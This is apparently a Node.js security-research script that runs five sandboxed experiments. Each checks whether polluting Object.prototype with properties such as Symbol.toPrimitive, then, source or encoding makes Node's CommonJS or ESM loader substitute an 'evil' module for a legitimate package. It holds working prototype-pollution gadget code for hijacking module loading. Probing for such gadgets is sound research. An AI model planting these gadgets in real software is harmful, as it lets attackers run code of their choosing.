// BL-111: does a plain DATA property on a builtin prototype -- no accessor,
// no [[Prototype]] change -- change what Node's loader loads? Each
// experiment runs in a fresh node process from a fresh project.
"use strict";
const { execFileSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

function project() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "bl111-gadget-"));
  const w = (rel, text) => {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), text);
  };
  w("node_modules/good/package.json", JSON.stringify({ name: "good", exports: { ".": "./index.js" }, main: "index.js" }));
  w("node_modules/good/index.js", 'module.exports = "GOOD";\n');
  w("node_modules/esm-good/package.json", JSON.stringify({ name: "esm-good", type: "module", exports: "./index.js" }));
  w("node_modules/esm-good/index.js", 'export default "GOOD";\n');
  w("evil/index.js", 'module.exports = "EVIL";\n');
  w("evil/esm.mjs", 'export default "EVIL";\n');
  return root;
}

const experiments = {
  "E1 Object.prototype[Symbol.toPrimitive], CJS require of an exports-map package": {
    file: "main.cjs",
    src: (root) => `
Object.prototype[Symbol.toPrimitive] = function (hint) {
  try { if (this instanceof URL && this.href.endsWith("/good/index.js")) return ${JSON.stringify("file://" + root + "/evil/index.js")}; } catch {}
  return hint === "number" ? NaN : Object.prototype.toString.call(this);
};
let r; try { r = require("good"); } catch (e) { r = "THROW " + e.message.split("\\n")[0]; }
delete Object.prototype[Symbol.toPrimitive];
console.log(r);
`,
  },
  "E2 Object.prototype.then, ESM import (the source load awaits a Buffer)": {
    file: "main.cjs",
    src: () => `
let fired = false;
Object.prototype.then = function (resolve) {
  if (Buffer.isBuffer(this) && String(this).includes("GOOD") && !fired) { fired = true; delete Object.prototype.then; return resolve(Buffer.from('export default "EVIL";')); }
  delete Object.prototype.then;
  resolve(this);
};
import("esm-good").then((m) => console.log(m.default), (e) => console.log("THROW " + e.message.split("\\n")[0]));
`,
  },
  "E3 Object.prototype.source, ESM import": {
    file: "main.cjs",
    src: () => `
Object.prototype.source = 'export default "EVIL";';
import("esm-good").then((m) => { delete Object.prototype.source; console.log(m.default); }, (e) => { delete Object.prototype.source; console.log("THROW " + e.message.split("\\n")[0]); });
`,
  },
  "E4 Object.prototype.encoding, CJS require": {
    file: "main.cjs",
    src: () => `
Object.prototype.encoding = "buffer";
let r; try { r = require("good"); } catch (e) { r = "THROW " + e.message.split("\\n")[0]; }
delete Object.prototype.encoding;
console.log(r);
`,
  },
  "E5 Object.prototype[Symbol.toPrimitive], ESM import": {
    file: "main.cjs",
    src: (root) => `
Object.prototype[Symbol.toPrimitive] = function (hint) {
  try { if (this instanceof URL && this.href.endsWith("/esm-good/index.js")) return ${JSON.stringify("file://" + root + "/evil/esm.mjs")}; } catch {}
  return hint === "number" ? NaN : Object.prototype.toString.call(this);
};
import("esm-good").then((m) => console.log(m.default), (e) => console.log("THROW " + e.message.split("\\n")[0]));
`,
  },
};

for (const [name, { file, src }] of Object.entries(experiments)) {
  const root = project();
  fs.writeFileSync(path.join(root, file), src(root));
  let out;
  try {
    out = execFileSync(process.execPath, [path.join(root, file)], { cwd: root, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], timeout: 20000 }).trim();
  } catch (e) {
    out = "PROCESS FAILED " + String(e.stderr).split("\n").filter(Boolean).slice(0, 2).join(" | ");
  }
  console.log(`${out.padEnd(10)} ${name}`);
}
